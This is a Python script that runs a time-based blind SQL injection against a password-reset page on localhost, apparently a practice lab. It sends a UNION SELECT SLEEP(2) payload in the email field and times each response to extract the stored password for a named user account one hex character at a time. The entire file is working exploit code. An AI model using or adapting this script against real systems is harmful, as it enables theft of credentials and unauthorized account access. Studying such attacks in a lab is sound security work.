import requests
import string
from datetime import datetime

# Define the URL you want to send the GET request to
url = "http://localhost/sites/sql_injection/example3/forgetpassword.php"

#get list of chars and digits
# alphabet_lower = list(string.ascii_lowercase)
# alphabet_upper = list(string.ascii_uppercase)
# alphabet = list(string.ascii_letters)
# digit = list(string.digits)

alphadigit = list(string.hexdigits)

recovered_password ="";
found = False

while True:

    for ch in alphadigit:
        mydata = {'email':"' union SELECT SLEEP(2) from users where email='alice@gmail.com' and password like '"+recovered_password+ch+"%' -- "}

        # Send the POST request and get the response
        response = requests.post(url, data=mydata)

        # Check the response status code
        if response.status_code == 200:
            # The request was successful, access the response content
            
            if(response.elapsed.total_seconds() > 1):
                recovered_password = recovered_password + ch 
                found =True

            print(ch,response.elapsed, recovered_password)
            

        else:
            # The request failed, handle the error
            print(f"Error: {response.status_code}")
    
    #Outside of the for loop, safe break if we didn't find anything
    if(found):
        found = False
    else:
        break

